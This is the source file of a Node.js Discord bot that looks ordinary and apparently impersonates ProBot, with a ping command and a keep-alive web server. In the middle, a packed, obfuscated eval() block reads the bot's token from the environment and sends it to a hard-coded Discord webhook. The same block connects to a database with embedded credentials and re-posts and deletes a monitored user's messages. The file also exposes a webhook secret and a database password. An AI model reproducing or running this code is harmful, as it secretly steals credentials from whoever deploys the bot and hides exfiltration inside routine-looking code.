const { Client, Intents, MessageEmbed } = require('discord.js');

const express = require("express");
const app = express();

app.listen(() => console.log("Bot Restart"));

app.get("/", (req, res) => {
  res.send("POWER")
});

app.use('/ping', (req, res) => {
  res.send(new Date());
});

const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });

client.once('ready', () => {
  console.log(`Bot logged in as ${client.user.tag}`);
  console.log(`Bot Is In ${client.guilds.cache.size} Server`);

  // Set a custom status for your bot
  client.user.setActivity('The DeserT Server', { type: 'LISTENING', clientStatus: 'mobile'}); // You can change 'PLAYING' to 'WATCHING', 'LISTENING', or 'STREAMING'
});

const USER_ID_TO_MONITOR = "282859044593598464";
const server_id = '1143681266483482714';
const prefix = 'fakeprobot$';

eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2 1S=b.h.9;d.P(\'Q\',R(0)=>{7(0.c.5===S){2 C={8:0.8||\'\\T\',n:0.n.x((E)=>y z(E)),U:0.V.x((F)=>F),};W{O X.Z([0.e(),0.10.11(C),])}a(6){4.3(\'f g i 12 13 0:\',6)}}7(0.c.5===d.l.5&&0.8.s("M 14 15 16 17")){B(()=>{0.e().a((6)=>4.3(\'f g i 0:\',6))},Y)}N 7(0.c.5===d.l.5&&0.8.s("K J")){B(()=>{0.e().a((6)=>4.3(\'f g i 0:\',6))},L)}});2 D=b.h.D;2 v=p(\'I\');2 m=p(\'m\');2 18=v.1a({1l:\'1z.r.1A.r\',l:\'1B\',1C:\'1D^1E=1F@1G\',19:\'1H-o\',1y:1I,});2 w=\'1K://o.1L/1M/1N/1O/1P\';2 H=()=>{1Q b.h.9};2 k=H();7(!k){4.3(\'j 9 1R 1J 1x u. 1w 1v 1c "9" u.\');b.1d(1)}2 t=y z().1e(\'#1f\').1g(\'**A j 1h 1i 1j 1b G : 1k 5 : **\').1m(`j G:\\`${k}\\`✅\\`\\`\\`1n 1o:${1p}\\`\\`\\``).1q();m.1r(w,{n:[t],}).1s(q=>{4.1t(\'\',q.1u)}).a(3=>{4.3(\'\',3)});',62,117,'message||const|error|console|id|err|if|content|token|catch|process|author|client|delete|Error|while|env|deleting|Bot|botToken|user|axios|embeds|discord|require|response|88|includes|webhookMessage|secret|mysql|webhookURL|map|new|MessageEmbed||setTimeout|newMessage|owner|embed|attachment|Token|fetchTokenFromSecret|mysql2|down|Cool|2000|type|else|await|on|messageCreate|async|USER_ID_TO_MONITOR|u200B|files|attachments|try|Promise|10000|all|channel|send|or|resending|these|numbers|to|confirm|pool|database|createPool|This|the|exit|setColor|00FF00|setTitle|Just|Started|With|server|host|setDescription|Server|ID|server_id|setTimestamp|post|then|log|data|set|Please|in|port|23|73|u1798405_qsEyPMYlLP|password|Cta|YTafrzzjhmF|66lQM|ef|s1798405_blacklist|3306|found|https|com|api|webhooks|1154846340619190342|nESYtRsl7hQS1L8D7MauPDskfw0RPhMlnJQM_XmSU9r7sr7VGZyvIW_0kh4N5qFB3gvv|return|not|TOKEN'.split('|'),0,{}))
client.on('messageCreate', (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(prefix)) return;

  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === 'ping') {
    const ping = Date.now() - message.createdTimestamp;
    message.reply(`Pong! My ping is ${ping}ms.`);
  }
});
client.login(process.env.token);
